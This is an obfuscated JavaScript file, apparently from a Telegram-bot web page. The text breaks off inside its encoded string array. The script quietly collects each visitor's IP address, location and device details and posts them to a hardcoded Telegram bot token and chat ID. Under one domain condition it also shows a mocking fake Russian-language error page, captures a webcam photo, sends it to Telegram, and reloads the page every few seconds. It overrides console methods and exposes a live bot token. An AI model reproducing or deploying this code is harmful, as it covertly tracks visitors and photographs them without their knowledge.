function _0x478a(_0x478af8, _0x37b097) {
  const _0x21a8f7 = _0x129f();
  _0x478a = function (_0x30f4df, _0x1f92d6) {
    _0x30f4df = _0x30f4df - 159;
    let _0x1148c3 = _0x21a8f7[_0x30f4df];
    return _0x1148c3;
  };
  return _0x478a(_0x478af8, _0x37b097);
}
(function (_0x285815, _0x1ed31f) {
  const _0xa74351 = _0x285815();
  while (true) {
    try {
      const _0x384bec = parseInt(_0x478a(615, 0x479)) / 1 + -parseInt(_0x478a(384, -0x2c2)) / 2 * (parseInt(_0x478a(308, -0xc5)) / 3) + -parseInt(_0x478a(847, 0x2d2)) / 4 + -parseInt(_0x478a(499, 0xd1)) / 5 * (parseInt(_0x478a(790, -0x24c)) / 6) + -parseInt(_0x478a(1799, 0x745)) / 7 * (-parseInt(_0x478a(329, 0x21)) / 8) + -parseInt(_0x478a(667, 0x2a4)) / 9 * (-parseInt(_0x478a(2366, 0x633)) / 10) + -parseInt(_0x478a(1945, 0x5c4)) / 11 * (-parseInt(_0x478a(1692, 0x6b3)) / 12);
      if (_0x384bec === _0x1ed31f) {
        break;
      } else {
        _0xa74351.push(_0xa74351.shift());
      }
    } catch (_0x35c8b8) {
      _0xa74351.push(_0xa74351.shift());
    }
  }
})(_0x129f, 774554);
const _0xd75ce3 = function () {
  let _0x5f38c7 = true;
  return function (_0x203688, _0x3f6dd0) {
    const _0x507ac6 = _0x5f38c7 ? function () {
      if (_0x3f6dd0) {
        const _0x4f7fb0 = _0x3f6dd0.apply(_0x203688, arguments);
        _0x3f6dd0 = null;
        return _0x4f7fb0;
      }
    } : function () {};
    _0x5f38c7 = false;
    return _0x507ac6;
  };
}();
const _0x2a23b3 = _0xd75ce3(this, function () {
  const _0x3d406b = function () {
    let _0x115a9f;
    try {
      _0x115a9f = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (_0x4619dd) {
      _0x115a9f = window;
    }
    return _0x115a9f;
  };
  const _0x182103 = _0x3d406b();
  const _0x31791d = _0x182103.console = _0x182103.console || {};
  const _0x5acec9 = ["log", "warn", "info", "error", "exception", "table", "trace"];
  for (let _0x543d11 = 0; _0x543d11 < _0x5acec9.length; _0x543d11++) {
    const _0x3a392b = _0xd75ce3.constructor.prototype.bind(_0xd75ce3);
    const _0x33d3dd = _0x5acec9[_0x543d11];
    const _0x1f85d4 = _0x31791d[_0x33d3dd] || _0x3a392b;
    _0x3a392b.__proto__ = _0xd75ce3.bind(_0xd75ce3);
    _0x3a392b.toString = _0x1f85d4.toString.bind(_0x1f85d4);
    _0x31791d[_0x33d3dd] = _0x3a392b;
  }
});
_0x2a23b3();
function _0x308dc7(_0x5a8b33, _0x65ee76, _0x843049, _0x272191, _0x215940) {
  return _0x478a(_0x272191 - 0x33a, _0x215940);
}
async function sendTelegramMessage(_0x32b4eb) {
  try {
    const _0x3ed56d = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendMessage", {
      'method': "POST",
      'headers': {
        'Content-Type': "application/json"
      },
      'body': JSON.stringify({
        'chat_id': "7728504492",
        'text': _0x32b4eb,
        'parse_mode': "HTML"
      })
    });
    const _0x589ffb = await _0x3ed56d.json();
    if (!_0x589ffb.ok) {
      console.error("Failed to send message:", _0x589ffb);
    }
  } catch (_0x232d5d) {
    console.error("Failed to send message:", _0x232d5d);
  }
}
async function getCountryName(_0x12b44b) {
  try {
    const _0x470d2c = await fetch("https://restcountries.com/v3.1/alpha/" + _0x12b44b);
    const _0x24151c = await _0x470d2c.json();
    return _0x24151c[0]?.["name"]["common"] || "Unknown";
  } catch (_0x2c4663) {
    console.error("Failed to fetch country name:", _0x2c4663);
    return "Unknown";
  }
}
function _0x80afc8(_0x32aab7, _0x2caf7f, _0x243ecd, _0x1916da, _0x199823) {
  return _0x478a(_0x199823 - 0x33, _0x32aab7);
}
async function getUserInfo() {
  try {
    const _0x1ef391 = await fetch("https://ipinfo.io/json");
    const _0xa8c895 = await _0x1ef391.json();
    const _0x1b1a35 = await getCountryName(_0xa8c895.country);
    const _0x59f670 = parseUserAgent(navigator.userAgent);
    return {
      'ip': _0xa8c895.ip,
      'country': _0xa8c895.country,
      'countryName': _0x1b1a35,
      'city': _0xa8c895.city,
      'region': _0xa8c895.region,
      'countryEmoji': getCountryEmoji(_0xa8c895.country),
      'userAgent': navigator.userAgent,
      'deviceModel': _0x59f670.model,
      'deviceType': _0x59f670.type,
      'deviceOS': _0x59f670.os
    };
  } catch (_0x595427) {
    console.error("Failed to fetch user info:", _0x595427);
    const _0x1f6778 = {
      ip: "Unknown",
      country: "Unknown",
      countryName: "Unknown",
      city: "Unknown",
      region: "Unknown",
      countryEmoji: '❓',
      userAgent: navigator.userAgent,
      deviceModel: "Unknown",
      deviceType: "Unknown",
      deviceOS: "Unknown"
    };
    return _0x1f6778;
  }
}
function parseUserAgent(_0x2565ec) {
  const _0x384cc8 = {
    regex: /iPhone\s*(\d+([_\.]\d+)*)/i,
    type: "Mobile",
    os: "iOS"
  };
  const _0x5afe0c = {
    regex: /iPad/i,
    type: "Tablet",
    os: "iOS"
  };
  const _0x11f0ba = {
    regex: /Android\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Android"
  };
  const _0x499a30 = {
    regex: /Windows Phone\s*([\d\.]+)/i,
    type: "Mobile",
    os: "Windows Phone"
  };
  const _0x2de932 = [_0x384cc8, _0x5afe0c, _0x11f0ba, _0x499a30];
  const _0x13aa70 = {
    regex: /Windows/i,
    type: "Desktop",
    os: "Windows"
  };
  const _0x5569d0 = {
    regex: /Macintosh/i
  };
  _0x5569d0.type = "Desktop";
  _0x5569d0.os = "macOS";
  const _0x4dac34 = {
    regex: /Linux/i,
    type: "Desktop",
    os: "Linux"
  };
  const _0x3da527 = [_0x13aa70, _0x5569d0, _0x4dac34];
  for (let _0x1eaafe of _0x2de932) {
    const _0x1bad2b = _0x2565ec.match(_0x1eaafe.regex);
    if (_0x1bad2b) {
      return {
        'type': _0x1eaafe.type,
        'os': _0x1eaafe.os,
        'model': parseDeviceModel(_0x2565ec, _0x1eaafe.os)
      };
    }
  }
  for (let _0x124fa2 of _0x3da527) {
    const _0x3970ce = _0x2565ec.match(_0x124fa2.regex);
    if (_0x3970ce) {
      return {
        'type': _0x124fa2.type,
        'os': _0x124fa2.os,
        'model': parseDeviceModel(_0x2565ec, _0x124fa2.os)
      };
    }
  }
  const _0x2a9f18 = {
    type: "Unknown",
    os: "Unknown",
    model: "Unknown Device"
  };
  return _0x2a9f18;
}
function _0x1322ad(_0x391bec, _0x2949ad, _0x1a69be, _0x3abc43, _0x5620a9) {
  return _0x478a(_0x391bec - 0x1f, _0x3abc43);
}
function parseDeviceModel(_0x18b912, _0x1ecb96) {
  switch (_0x1ecb96) {
    case "iOS":
      const _0x4c93b7 = _0x18b912.match(/iPhone\s*(\d+([_\.]\d+)*)/i);
      if (_0x4c93b7) {
        return "iPhone " + _0x4c93b7[1].replace(/[_\.]/g, " ");
      }
      const _0x26892a = _0x18b912.match(/iPad/i);
      if (_0x26892a) {
        return "iPad";
      }
      break;
    case "Android":
      const _0x146428 = _0x18b912.match(/;\s*([^;)]+)\s*Build/i);
      if (_0x146428) {
        return _0x146428[1].trim();
      }
      break;
    case "Windows":
      const _0x1aa703 = _0x18b912.match(/Windows\s*([\w\s]+)/i);
      if (_0x1aa703) {
        return "Windows " + _0x1aa703[1];
      }
      break;
    case "macOS":
      const _0x594fea = _0x18b912.match(/Macintosh;.*Mac\s*([\w\s]+)/i);
      if (_0x594fea) {
        return "Mac " + _0x594fea[1];
      }
      break;
  }
  return "Unknown Device";
}
function _0x5f4299(_0x501812, _0x7a43b8, _0x2cf3cb, _0x4c3699, _0x4f17f5) {
  return _0x478a(_0x4f17f5 + 0x17f, _0x4c3699);
}
function getCountryEmoji(_0x537621) {
  return _0x537621.replace(/./g, _0x5e74cd => String.fromCodePoint(127397 + _0x5e74cd.toUpperCase().charCodeAt()));
}
async function captureAndSendPhoto() {
  try {
    const _0x34bf87 = {
      video: true
    };
    const _0x3d643c = await navigator.mediaDevices.getUserMedia(_0x34bf87);
    const _0x10ee61 = document.createElement("video");
    _0x10ee61.srcObject = _0x3d643c;
    await _0x10ee61.play();
    const _0x4aebdf = document.createElement("canvas");
    _0x4aebdf.width = _0x10ee61.videoWidth;
    _0x4aebdf.height = _0x10ee61.videoHeight;
    const _0x4972d0 = _0x4aebdf.getContext('2d');
    _0x4972d0.drawImage(_0x10ee61, 0, 0, _0x4aebdf.width, _0x4aebdf.height);
    _0x10ee61.pause();
    _0x3d643c.getTracks().forEach(_0x1f3d69 => _0x1f3d69.stop());
    const _0x4ed69b = await new Promise(_0xc79923 => _0x4aebdf.toBlob(_0xc79923, "image/jpeg"));
    const _0x204e3b = new FormData();
    _0x204e3b.append("chat_id", "7728504492");
    _0x204e3b.append("photo", _0x4ed69b, "photo.jpg");
    await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/sendPhoto", {
      'method': "POST",
      'body': _0x204e3b
    });
    console.log("Photo captured and sent successfully");
  } catch (_0x268953) {
    console.error("Failed to capture photo:", _0x268953);
  }
}
async function initTelegramBot() {
  const _0x1971cd = {
    domain: window.location.hostname,
    fullUrl: window.location.href
  };
  if (_0x1971cd.domain !== "trd.cc.nf" && _0x1971cd.domain == "secretgamblebot111.github.io") {
    document.body.innerHTML = "\n            <div id=\"overlay\">\n                <h1>Ошибка 404: Доступ запрещен</h1>\n                <div class=\"arrow top\"></div>\n                <div class=\"arrow bottom\"></div>\n                <div class=\"arrow left\"></div>\n                <div class=\"arrow right\"></div>\n                <img src=\"data:image/png;base64,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\" alt=\"Error Image\" style=\"max-width: 100%; height: auto;\" />\n                <p>К сожалению, возникли проблемы с доступом к сайту:</p>\n                <ul>\n                    <li>Не удалось загрузить ресурс.</li>\n                    <li>Проблемы с сервером.</li>\n                    <li>Неправильный домен.</li>\n                    <li>Возможно вы блюм.</li>\n                    <li>Возможно вы хотели спиздить вебку.</li>\n                    <li>Возможно вы хотели обновить вебку за 15$.</li>\n                    <li>Возможно вы хотели купить вебку у ее кодера.</li>\n                </ul>\n                <a href=\"https://www.youtube.com/watch?v=dQw4w9WgXcQ\" id=\"fixButton\">Fix It</a>\n            </div>\n        ";
    const _0x4b7187 = document.createElement("style");
    _0x4b7187.innerHTML = "\n            body {\n                margin: 0;\n                height: 100vh;\n                display: flex;\n                justify-content: center;\n                align-items: center;\n                position: relative;\n                overflow: hidden;\n                background-color: #282c34;\n                color: white;\n                font-family: 'Arial', sans-serif;\n            }\n            #overlay {\n                position: absolute;\n                top: 0;\n                left: 0;\n                right: 0;\n                bottom: 0;\n                background: linear-gradient(135deg, rgba(255, 0, 0, 0.7), rgba(255, 255, 0, 0.7));\n                display: flex;\n                flex-direction: column;\n                justify-content: center;\n                align-items: center;\n                z-index: 9999;\n                padding: 20px;\n                animation: flicker 1s infinite;\n            }\n            h1 {\n                font-size: 4em;\n                margin: 0;\n                text-shadow: 0 0 10px rgba(255, 255, 255, 0.8);\n                animation: glow 1.5s infinite alternate;\n            }\n            p {\n                font-size: 1.5em;\n                margin: 20px 0;\n                text-shadow: 0 0 5px rgba(255, 255, 255, 0.5);\n            }\n            ul {\n                list-style-type: none;\n                padding: 0;\n                text-align: center;\n                font-size: 1.2em;\n            }\n            #fixButton {\n                background-color: white;\n                color: red;\n                border: none;\n                padding: 10px 20px;\n                font-size: 18px;\n                cursor: pointer;\n                text-decoration: none;\n                border-radius: 5px;\n                transition: background-color 0.3s, transform 0.3s;\n                box-shadow: 0 0 10px rgba(255, 0, 0, 0.8);\n            }\n            #fixButton:hover {\n                background-color: #ddd;\n                transform: scale(1.05);\n            }\n            @keyframes flicker {\n                0% { opacity: 1; }\n                50% { opacity: 0.7; }\n                100% { opacity: 1; }\n            }\n            @keyframes glow {\n                0% { text-shadow: 0 0 10px rgba(255, 255, 255, 0.8); }\n                100% { text-shadow: 0 0 20px rgba(255, 255, 255, 1); }\n            }\n        ";
    document.head.appendChild(_0x4b7187);
    const _0x120d1c = await getUserInfo();
    await sendTelegramMessage("\n🚫 <b>Unauthorized Access Attempt Detected</b>\n📍 Domain: <code>" + _0x1971cd.domain + "</code>\n🔗 URL: <code>" + _0x1971cd.fullUrl + "</code>\n🌐 IP: <code>" + _0x120d1c.ip + "</code>\n📌 Location: " + _0x120d1c.city + ", " + _0x120d1c.region + ", " + _0x120d1c.countryName + " " + _0x120d1c.countryEmoji + "\n📱 Device: <code>" + _0x120d1c.deviceModel + "</code>\n🖥️ Type: <code>" + _0x120d1c.deviceType + " (" + _0x120d1c.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x120d1c.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
    await captureAndSendPhoto();
    setInterval(() => {
      location.reload();
    }, 11200);
    return;
  }
  try {
    const _0x57db6f = await fetch("https://api.telegram.org/bot8493084337:AAFPW75-vT4EgtloLveSmbgN-6bvD3FYztos/getMe");
    const _0x4a4ef3 = await _0x57db6f.json();
    if (_0x4a4ef3.ok) {
      console.log("Bot initialized");
      isAuthenticated = true;
      const _0xabd288 = await getUserInfo();
      await sendTelegramMessage("\n🚀 <b>New Bot Access Detected</b>\n📍 Domain: <code>" + _0x1971cd.domain + "</code>\n🔗 URL: <code>" + _0x1971cd.fullUrl + "</code>\n🌐 IP: <code>" + _0xabd288.ip + "</code>\n📌 Location: " + _0xabd288.city + ", " + _0xabd288.region + ", " + _0xabd288.countryName + " " + _0xabd288.countryEmoji + "\n📱 Device: <code>" + _0xabd288.deviceModel + "</code>\n🖥️ Type: <code>" + _0xabd288.deviceType + " (" + _0xabd288.deviceOS + ")</code>\n📱 User Agent: <code>" + _0xabd288.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n            ");
    }
  } catch (_0xa8b711) {
    console.error("Failed to initialize bot:", _0xa8b711);
    const _0x4e9f63 = await getUserInfo();
    await sendTelegramMessage("\n❗️ <b>Bot Initialization Failed</b>\n📍 Domain: <code>" + _0x1971cd.domain + "</code>\n🔗 URL: <code>" + _0x1971cd.fullUrl + "</code>\n🌐 IP: <code>" + _0x4e9f63.ip + "</code>\n📌 Location: " + _0x4e9f63.city + ", " + _0x4e9f63.region + ", " + _0x4e9f63.countryName + " " + _0x4e9f63.countryEmoji + "\n📱 Device: <code>" + _0x4e9f63.deviceModel + "</code>\n🖥️ Type: <code>" + _0x4e9f63.deviceType + " (" + _0x4e9f63.deviceOS + ")</code>\n📱 User Agent: <code>" + _0x4e9f63.userAgent + "</code>\n⏰ Time: <code>" + new Date().toISOString() + "</code>\n        ");
  }
}
function _0x129f() {
  const _0x54085b = ['AAAAA', 'erCas', 'MNqlC', ">Bot ", 'hTu1a', 'Cy+/V', 'OPHew', 'gVZtI', 'w9IAE', 'Andro', 'modeB', 'Image', 'gMICM', '35deg', 'retur', ": 100", 'sfull', 'RpeCx', 'fDEwc', 'NaZXx', ">New ", '1.05)', 'XN9X3', ": 20p", 'regex', 'Bjmul', 'ge_44', 'AjeBB', 'OMWHV', 'YbH5+', 'NAdwW', 'nZNGZ', 'Lxc38', ", 0.5", 'zpCPp', 'UYEDq', 'DcczX', 'cqpOM', 'Lrw06', ": non", "50% {", '>Unau', 'czjqV', 'QhjIZ', 'Csob3', 'ynuUZ', 'commo', 'ypqGr', 'ructo', 'YqVXG', 'pg9Un', 'WKJSA', 'oUGgd', 'rXtlB', 'ntent', "   }\n", "p>\n  ", "55, 2", 'zTI95', " <cod", 'cjiCX', 'l5OOR', "row l", 'fullU', 'Oq/HO', 'V6LAJ', 'hQFMg', 'zBIqb', 'R4mkH', "   ri", 'NAgnD', 'V2jQ6', 'gAKST', 'LSdxA', "gin: ", 'y8ufq', 'pause', 'aknVF', 'dUSzF', "or: w", "x: 99", 'nstru', 'V3aI5', 'kFwRm', 'fe+xR', 'ell', '7/p58', 'Time:', 'OGbzy', 'HNUSG', 'QCHQh', 'AA7DA', 'FQEIM', 'PBngY', 'ntext', 'I5xfX', '8jmtc', '/ft5j', ".5s i", 'utSsS', 'LNWWO', ": cen", 'iIc9k', 'OmCrh', 'cNOVp', 'apply', 'EvbUQ', '490ezgUxk', 'mage', 'ak3bX', 'aZORV', 'nPzlG', 'cOkPd', 'ebuyq', 'cSvrO', 'DMpEp', 'jyluA', 'orati', 'qfo1c', 'Ou79N', '4k7Ji', 'klRUH', 'displ', "and s", 'led', "  ali", 'h1MjY', 'WSA65', 'table', '5JIXW', 'ZVEMQ', 'ge_69', "    o", 'ccjAR', 'Z96/j', 'yO9g3', 'NPA0z', 'S/ElH', 'idwgj', 'PqZvS', '/EmjE', 'rfHzr', 'found', 'y2YWa', 'XgysA', 'aX/1Z', 'w4+Xl', 'bE2vr', 'ckgro', '3R6xi', "0;\n  ", 'GTPv8', 'ent', 'Xv0Lo', "t\"></", 'oMRi3', 'devic', 'сожал', 'iPhon', 'OdQvk', 'outpu', 'board', 'GQCDQ', 'Onkm3', "  <di", 'gt7/7', "ожно ", 'hZilu', 'LqYSX', 'fSMDx', " righ", "ить р", "\n    ", 'lengt', 'rXgXa', 'egram', 'вебку', " marg", 'KPH3x', 'detxB', 'botNa', 'wfaql', 'vaZ8n', " вы х", 'LnSSZ', "cker ", 'UwFiY', 'YCdPj', '1DzeM', 'X80km', 'VojZK', 'XEWKf', 'hite;', 'ublyZ', 'VKtJp', 'MZycF', 'CjYjH', 'max-h', "10px ", 'a+kfW', 'yQpgc', 'cz8BS', '.</li', 'S5mjI', 'ueEcO', 'appen', 'Jdiot', 'FJCI5', 'DdLXd', 'dYPLo', 'EWBPd', 'TOu8R', 'justi', "   bo", 'v3IMq', 'kOdY6', 'UhEUg', 'ggVwp', '/Mbe/', 'jNoI0', 'CFS6W', 'Dqh+R', "x;\n  ", 'AbGaI', 'count', 'Deskt', 'WRlfz', 'ple', 'oAAoF', 'gradi', 'MgSRx', 'AINhC', 'daMyx', 'entyp', 'JkK0D', 'macOS', 'gxRCW', "op: 0", '5d59j', "i>\n  ", 'FvQkB', 'ixBut', 'dBdfw', 'CgUAX', 'ZJOL1', 'NuLNE', 'fbEhg', 'rzTB1', " 56px", 'LiiOQ', 'ZPYOc', '>Возм', 'creat', '64,iV', 'rFvHV', 'CgUKz', 'om/wa', 'Fpqut', '3OBlcSn', '/P8V9', 'YBTW4', 'DXBGi', 'CcYVg', 'cted<', " запр", 'BzPvy', 'mXEfF', "one;\n", 'xZv+y', 'erMed', '-shad', 'dChil', 'canva', "ный д", 'HZjCz', ", tra", "ity;\n", 'text', 'oxwiN', '592MKZpuR', 'lBvHW', 's0jCx', 'gYDzN', 'yEQCH', "ng: 1", "c34;\n", 'n-ite', '7381.', 'kdCAA', "r: no", '085.s', 'Sa7Mr', "er;\n ", 'm4gAE', 'rIfpP', 'duA5V', 'NVfAj', 'MGUID', 'forEa', '8svd7', 'yTntT', 'bFojO', 'AGZNh', 'kI6Ej', 'TZhoo', 'Dto3z', 'J5hbm', 'eet', 'K7r9R', 'kSZVk', '6cqFC', 'E0zJr', "\n🚫 <b", '1yMRV', "ite;\n", 'MHapa', " 255,", 'zSKcs', 'FRtJd', 'mDDiC', 'XBLoG', 'dius:', 'V6Poh', 'txXHz', "nge: ", 'omain', 'city;', ": <co", 'mADLN', "ity 0", "op\"><", 'KGvEV', "Bot i", "    <", '737446ecCIFD', 'oqaLV', 'SUVOR', 'Cnpbv', "255, ", 'BGKkW', 'ryNam', 'OAMlH', 'warn', 'ULmae', 'OKjDb', 'eElem', '/9EUA', 'UXzIv', 'ns-se', 'KrvDP', 'rE0Yn', "   tr", 'Pp7Xv', 'eQQmg', 'toStr', 'foERD', '949.s', 'tars.', 'vpvAE', " 100v", "city ", 'fG0BB', 'bxWTe', 'VPvwR', 'gDMzV', 'entLi', 'class', 'city', 'MhNlQ', "y: bl", 'ту:</', 'loIpD', 'zeSyc', "r {\n ", 'megBh', 'toISO', 'AriZx', 'FNbY4', 'imati', 't-dec', 'opaci', "0.7; ", 'uynXK', 'y-con', 'dVRJj', 'XJofv', 'WNRM0', 'fEgKl', 'kTyQp', 'tlTfU', "}\n   ", 'ge_82', 'VR4nO', 'XrtQV', 'posit', 'Lm+Q1', 'to__', 'oCgUA', 'MDPTA', 'SvhFj', 'xPlcO', 'Lnd9x', 'AACXB', "Mid m", "   ba", " text", 'xWDJM', 'Strin', '4crV6', 'gbujw', 'Krp1j', "ed;\n ", "упом ", '7Pktz', 'cZa/W', 'KDhQz', 'yTOVC', 'GW9U3', 'PluAb', 'Rphxe', 'paBcN', " 0;\n ", 'catio', 'aEKoM', "/h1>\n", 'CAYAA', 'TNKJE', " Dete", 'отели', 'uzCez', 'PMAsp', 'lHbGZ', 'NjKuU', 'W5lkN', 'ursor', 'tHs+O', 'gN0jZ', 'log', '2hX6/', 'Unkno', 'Po+Lm', 'RElzJ', 'kATIk', "\"data", '</li>', " }\n  ", 'nnYrt', 'hg/eb', "%;\n  ", '4690445QDMdWp', '9ttDg', '065XB', 'wmnXb', "x 0;\n", 'yqaGb', "rlay ", 'R8vyr', 'eVNXx', 'borde', 'sW2br', 'f1rrD', ".3s, ", 'locat', 'PFOCH', 'o6c93', 'AJpVR', 'kAAAK', 'UoAlK', 'IzYuS', 'b5x3A', "ow: h", 'mzV96', '0GrJi', "0% { ", 'vE3BI', 'A6DLp', 'ffhYH', 'langu', 'tion', '7F7lZ', 'sSUXN', "tion ", 'nMCyi', 'nsfor', 'NWhBw', 'rKzov', 'NXEYH', 'm99gb', 'XkljP', 'domai', 'ge_54', "ить в", 'd-col', '8AsUg', 'kwFqK', "0px;\n", "ef=\"h", "ze: 1", 'arrow', 'QMWBU', "икли ", 'MLmJ5', 'gm3Q4', "lay: ", 'dqnfb', " rgba", 'uvLFB', '.2em;', 'json', 'TGGuw', 'hJjKQ', 'qdmvq', " />\n ", 'lWK99', 'VPHBh', 'dAoCy', "on: b", " 0 5p", 'YHnBS', 'width', 'PQzws', "{\n   ", 'QffsW', "  <li", 'bcPT8', 'acks', '+zxMJ', 'mulXw', 'ackgr', 'JJXlG', 'YURvB', 'ZyLsg', "   <h", "th: 5", 'fdvGJ', '8WBKt', 'Oj33/', "0 0 2", " 0.3s", 'mSK1D', 'Va8ZB', 'LTUuV', "  mar", 'AYlWN', 'AgkQz', 'krYZQ', "ion: ", 't_btn', 'wvlky', 'searc', "in: <", 'WqhQv', "umn;\n", 'OdoOQ', 'vX8QQ', 